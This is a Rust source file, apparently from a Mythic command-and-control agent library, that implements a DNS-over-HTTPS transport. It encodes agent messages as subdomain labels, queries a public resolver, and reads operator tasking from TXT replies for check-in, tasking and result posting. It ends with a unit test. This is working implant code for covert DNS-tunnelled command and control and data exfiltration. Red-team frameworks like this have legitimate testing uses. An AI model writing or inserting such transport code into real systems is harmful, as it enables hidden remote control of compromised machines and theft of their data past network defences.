//! DNS transport — minimal DoH (DNS-over-HTTPS JSON API) implementation.
//!
//! This is a small, dependency-light approximation of the Mythic `dns` profile:
//! the agent message is split into DNS labels and queried as a subdomain of the
//! configured `domain`; the server response is expected in a TXT record and is
//! returned as the packed response string.

use std::time::Duration;

use ureq::Agent;

use crate::{C2Transport, MythicError, MythicResult};

use super::DEFAULT_USER_AGENT;

/// Configuration for the Mythic `dns` C2 profile.
#[derive(Debug, Clone, serde::Deserialize, serde::Serialize)]
pub struct DnsConfig {
    pub aes_psk: Option<String>,
    pub domain: String,
    pub resolver_url: String,
    pub record_type: String,
    pub encrypted_exchange_check: bool,
}

impl Default for DnsConfig {
    fn default() -> Self {
        Self {
            aes_psk: None,
            domain: String::new(),
            resolver_url: "https://dns.google/resolve".into(),
            record_type: "TXT".into(),
            encrypted_exchange_check: false,
        }
    }
}

/// Synchronous DNS-over-HTTPS transport.
pub struct DnsTransport {
    config: DnsConfig,
    agent: Agent,
}

impl DnsTransport {
    pub fn new(config: DnsConfig) -> MythicResult<Self> {
        let agent = Agent::new_with_config(
            Agent::config_builder()
                .timeout_global(Some(Duration::from_secs(30)))
                .http_status_as_error(false)
                .user_agent(DEFAULT_USER_AGENT)
                .build(),
        );
        Ok(Self { config, agent })
    }

    fn query_name(&self, message: &str) -> String {
        let encoded = to_dns_labels(message);
        if encoded.is_empty() {
            self.config.domain.clone()
        } else {
            format!("{}.{}", encoded, self.config.domain)
        }
    }

    fn resolve(&self, message: &str) -> MythicResult<String> {
        let name = self.query_name(message);
        let url = self.config.resolver_url.trim_end_matches('?');
        let resp = self
            .agent
            .get(url)
            .query("name", &name)
            .query("type", &self.config.record_type)
            .header("Accept", "application/dns-json")
            .call()
            .map_err(|e| MythicError::transport(format!("{e}")))?;

        let status = resp.status().as_u16();
        if status >= 400 {
            return Err(MythicError::HttpStatus(status));
        }
        let body_str = resp
            .into_body()
            .read_to_string()
            .map_err(|e| MythicError::transport(format!("{e}")))?;
        let body: serde_json::Value =
            serde_json::from_str(&body_str).map_err(|e| MythicError::transport(format!("{e}")))?;

        extract_txt(&body)
    }
}

impl C2Transport for DnsTransport {
    fn get_aes_psk(&self) -> Option<String> {
        self.config.aes_psk.clone()
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        self.config.aes_psk = Some(key.to_string());
        self.config.aes_psk.clone()
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.config.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> Result<String, MythicError> {
        self.resolve(packed)
    }

    fn get_tasking(&self, packed: &str) -> Result<String, MythicError> {
        self.resolve(packed)
    }

    fn post_response(&self, packed: &str) -> Result<String, MythicError> {
        self.resolve(packed)
    }
}

/// Split a base64 message into DNS labels (max 63 chars each).
fn to_dns_labels(message: &str) -> String {
    message
        .as_bytes()
        .chunks(63)
        .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
        .collect::<Vec<_>>()
        .join(".")
}

fn extract_txt(body: &serde_json::Value) -> MythicResult<String> {
    let answers = body
        .get("Answer")
        .and_then(|a| a.as_array())
        .ok_or(MythicError::InvalidPacket)?;
    for ans in answers {
        if let Some(data) = ans.get("data").and_then(|d| d.as_str()) {
            let cleaned = data.trim_matches('"');
            if !cleaned.is_empty() {
                return Ok(cleaned.to_string());
            }
        }
    }
    Err(MythicError::InvalidPacket)
}

#[cfg(test)]
mod tests {
    use super::*;
    use httptest::{Expectation, Server, matchers::*, responders::*};

    #[test]
    fn dns_doh_roundtrip() {
        let srv = Server::run();
        srv.expect(
            Expectation::matching(all_of!(
                request::method("GET"),
                request::path("/resolve"),
                request::query(url_decoded(contains(("name", any())))),
                request::query(url_decoded(contains(("type", "TXT"))))
            ))
            .respond_with(
                status_code(200)
                    .body(r#"{"Answer":[{"data":"\"cmVzcA==\""}]}"#)
                    .insert_header("Content-Type", "application/dns-json"),
            ),
        );

        let url = srv.url("/resolve");
        let cfg = DnsConfig {
            domain: "example.com".into(),
            resolver_url: url.to_string(),
            ..Default::default()
        };
        let t = DnsTransport::new(cfg).unwrap();
        let resp = t.get_tasking("hello").unwrap();
        assert_eq!(resp, "cmVzcA==");
    }
}
